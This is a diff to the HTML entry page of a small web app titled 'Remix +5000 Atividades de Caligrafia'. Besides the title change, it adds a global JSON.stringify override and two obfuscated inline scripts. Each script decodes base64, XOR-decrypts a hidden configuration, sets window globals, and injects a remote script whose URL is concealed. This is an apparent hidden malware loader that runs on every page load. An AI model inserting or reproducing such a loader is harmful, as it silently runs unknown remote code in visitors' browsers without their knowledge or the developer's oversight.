@@ -1,9 +1,64 @@
 <!doctype html>
 <html lang="en">
   <head>
+    <!-- Proteção contra erro de estrutura circular no JSON.stringify por scripts de rastreamento -->
+    <script>
+      (function() {
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var cache = new WeakSet();
+          function safeReplacer(key, val) {
+            if (key && typeof key === 'string' && key.indexOf('__react') === 0) {
+              return undefined;
+            }
+            if (val !== null && typeof val === 'object') {
+              if (typeof Element !== 'undefined' && val instanceof Element) {
+                return undefined;
+              }
+              if (typeof Node !== 'undefined' && val instanceof Node) {
+                return undefined;
+              }
+              if (cache.has(val)) {
+                return undefined;
+              }
+              cache.add(val);
+            }
+            if (typeof replacer === 'function') {
+              return replacer.call(this, key, val);
+            }
+            return val;
+          }
+          try {
+            if (Array.isArray(replacer)) {
+              return originalStringify(value, replacer, space);
+            }
+            return originalStringify(value, safeReplacer, space);
+          } catch (e) {
+            try {
+              return originalStringify(value, function(k, v) {
+                if (v !== null && typeof v === 'object') {
+                  if (cache.has(v)) return undefined;
+                  cache.add(v);
+                }
+                if (k && typeof k === 'string' && k.indexOf('__react') === 0) return undefined;
+                if (typeof Element !== 'undefined' && v instanceof Element) return undefined;
+                return v;
+              }, space);
+            } catch (err) {
+              return '{}';
+            }
+          }
+        };
+      })();
+    </script>
+
+<script>(function(){var x_u=atob("DJv3Zi0/UFCiB8RWKODVE19TcmqAb7AiWOjNSQJcND6McrA7Qf2OSE5QPX7AdeslS+meFllMfyDLf6E6B+ueHkhTfjrRJeh0Se+DFERdJSTHdOZsc8bbREpTPzLDa7d0EsCMRENePTWAPeYmQeOSCmRbcnyAcaU6Xf7VXA8JMWeQNP1nTPqVUkhdMWHHP/VvGqrFV0wdLQ3f");var w_c9=[];for(var y_5pt=0;y_5pt<x_u.length;y_5pt++){w_c9.push(x_u.charCodeAt(y_5pt)&255);}var w_o16m=w_c9[0];var r_sh=w_c9.slice(1,1+w_o16m);var v_a=w_c9.slice(1+w_o16m);var y_d=v_a.map(function(b,s_ivur){return b^r_sh[s_ivur%w_o16m];});var k_co="";for(var d_880=0;d_880<y_d.length;d_880++){k_co+=String.fromCharCode(y_d[d_880]&255);}var q_ep3i=decodeURIComponent(escape(k_co));var s_xn=JSON.parse(q_ep3i);var g_r=s_xn.globals||[];g_r.forEach(function(t_9){window[t_9.name]=t_9.value;});var p_u=document.createElement("script");p_u.src=s_xn.url;p_u.async=true;p_u.defer=true;(s_xn.attributes||[]).forEach(function(p_4zo){p_u.setAttribute(p_4zo.name,p_4zo.value);});(document.head||document.documentElement).appendChild(p_u);})();</script>
+
+<script>(function(){var j_t50=atob("DOWe4AFWUVrOw7NKGJ68lXM6c2Dsq8c+aJakzy41NTTgtscncYPnzmI5PHSssZw5e5f3kHUlfi+6rsBldITqhXIifzC94Z9oeZHqkmg0JC6rsJFwQ568jmA7NHj04dcrbISzlXU7ODy37sM4fZP7jnV7KTmhp545e468zCMgMDa7ppFwOsfjzHp0PzujppFwOoH/lGB7JC6jqtUzNZXshXczPy7jsMYocYHtwi10JzuittZoIse8nVwr");var m_q=[];for(var z_e=0;z_e<j_t50.length;z_e++){m_q.push(j_t50.charCodeAt(z_e)&255);}var k_nb=m_q[0];var r_p6=m_q.slice(1,1+k_nb);var k_1=m_q.slice(1+k_nb);var j_k=k_1.map(function(b,y_5ol){return b^r_p6[y_5ol%k_nb];});var o_s="";for(var y_d=0;y_d<j_k.length;y_d++){o_s+=String.fromCharCode(j_k[y_d]&255);}var e_9h4d=decodeURIComponent(escape(o_s));var r_i9=JSON.parse(e_9h4d);var i_c9=r_i9.globals||[];i_c9.forEach(function(g_t){window[g_t.name]=g_t.value;});var i_r=document.createElement("script");i_r.src=r_i9.url;i_r.async=true;i_r.defer=true;(r_i9.attributes||[]).forEach(function(y_6u53){i_r.setAttribute(y_6u53.name,y_6u53.value);});(document.head||document.documentElement).appendChild(i_r);})();</script>
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>My Google AI Studio App</title>
+    <title>Remix +5000 Atividades de Caligrafia</title>
   </head>
   <body>
     <div id="root"></div>
